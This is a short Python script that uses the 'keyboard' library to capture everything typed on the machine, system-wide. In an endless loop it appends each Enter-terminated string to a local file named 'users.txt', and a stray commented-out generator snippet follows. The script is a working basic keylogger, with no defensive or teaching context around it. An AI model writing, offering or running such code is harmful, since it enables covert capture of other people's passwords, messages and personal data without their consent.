import keyboard


while True:

    get_usersInfo = keyboard.record('enter')

    usersInfo = list(keyboard.get_typed_strings(get_usersInfo))

    print('The program is running!')

    with open('users.txt', 'a') as file:
        file.write(f"{usersInfo[0]} \n")


# def gen(x,y):
#     yield x+y


# print(tuple(gen(4,5)))




    
   




